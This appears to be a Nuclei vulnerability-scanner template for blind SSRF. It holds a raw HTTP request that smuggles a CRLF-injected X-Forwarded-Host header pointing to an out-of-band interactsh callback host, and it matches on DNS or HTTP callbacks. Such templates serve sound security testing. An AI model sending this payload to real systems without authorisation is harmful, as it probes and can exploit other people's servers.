id: 0x104

info:
  name: Blind SSRF
  author: reewardius
  severity: high
  tags: ssrf

http:
  - raw:
      - |
        GET /%20HTTP/1.1%3F%0DX-Forwarded-Host:%20{{Host}}.{{Port}}.BSSRF-104.{{interactsh-url}}%3F%0D%3F%0D HTTP/1.1
        Host: {{Hostname}}
        Cache-Control: no-transform
        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
        Accept-Encoding: gzip, deflate
        Accept: */*

    unsafe: true
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
          - "http"
        condition: or